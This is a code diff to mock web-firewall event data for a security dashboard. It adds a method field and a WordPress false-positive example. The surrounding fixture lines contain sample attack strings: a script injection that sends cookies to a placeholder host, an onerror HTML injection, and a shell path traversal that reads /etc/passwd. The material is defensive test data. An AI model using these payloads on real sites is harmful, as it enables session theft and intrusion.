@@ -82,7 +82,7 @@ export const sites: SiteView[] = [
 
 interface SourcePlan {
   ip: string; country: string; site: string; host: string; startMin: number; minutes: number; count: number; blocked: boolean
-  kinds: { cat: string; rule: string; msg: string; sev: number; uri: string; data: string }[]
+  kinds: { cat: string; rule: string; msg: string; sev: number; uri: string; data: string; method?: string }[]
 }
 
 const plans: SourcePlan[] = [
@@ -94,6 +94,13 @@ const plans: SourcePlan[] = [
   { ip: '103.152.118.40', country: 'ID', site: S.tea, host: 'lanterntea.com.tw', startMin: 230, minutes: 40, count: 9, blocked: true, kinds: [
     { cat: 'xss', rule: '941100', msg: 'XSS Attack Detected via libinjection', sev: 2, uri: '/search?q=<script>document.location="//x.example/"+document.cookie</script>', data: 'Matched Data: XSS data found within ARGS:q: <script>document.location=...' },
     { cat: 'xss', rule: '941160', msg: 'NoScript XSS InjectionChecker: HTML Injection', sev: 2, uri: '/product/oolong-150g?review=<img src=x onerror=alert(1)>', data: 'Matched Data: <img src=x onerror found within ARGS:review' },
+  ] },
+  // the shop's own office saving a post: a false alarm the WordPress profile would prevent
+  { ip: '61.219.11.20', country: 'TW', site: S.tea, host: 'lanterntea.com.tw', startMin: 52, minutes: 18, count: 4, blocked: true, kinds: [
+    { cat: 'xss', rule: '941160', msg: 'NoScript XSS InjectionChecker: HTML Injection', sev: 2, method: 'POST', uri: '/wp-admin/post.php',
+      data: 'Matched Data: <iframe  found within ARGS:content: <p>Spring harvest at the garden:</p><iframe src="https://www.youtube.com/embed/k3Q9dW...' },
+    { cat: 'xss', rule: '941180', msg: 'Node-Validator Deny List Keywords', sev: 2, method: 'POST', uri: '/wp-json/wp/v2/posts/214',
+      data: 'Matched Data: <!-- found within ARGS:json.content: <!-- wp:paragraph -->\\n<p>New season oolong is here' },
   ] },
   { ip: '185.220.101.4', country: 'DE', site: S.archive, host: 'archive.oldstreet.org.tw', startMin: 610, minutes: 6, count: 5, blocked: true, kinds: [
     { cat: 'rce', rule: '932160', msg: 'Remote Command Execution: Unix Shell Code Found', sev: 2, uri: '/photos/../../bin/sh?cmd=cat%20/etc/passwd', data: 'Matched Data: bin/sh found within REQUEST_FILENAME' },
@@ -116,7 +123,7 @@ for (const p of plans) {
     const ts = at(msAgo)
     attacks.push({
       tx_id: tx, ts, site_id: p.site, client_ip: p.ip, country: p.country, categories: [k.cat], matches: p.blocked ? 2 : 1,
-      severity: k.sev, rule_id: k.rule, msg: k.msg, data: k.data, blocked: p.blocked, method: k.uri.includes('/edit') ? 'POST' : 'GET',
+      severity: k.sev, rule_id: k.rule, msg: k.msg, data: k.data, blocked: p.blocked, method: k.method ?? (k.uri.includes('/edit') ? 'POST' : 'GET'),
       host: p.host, uri: k.uri, status: p.blocked ? 403 : 200,
     })
     const ev = (rule: string, msg: string, cat: string, data: string, sev: number): EventRow => ({
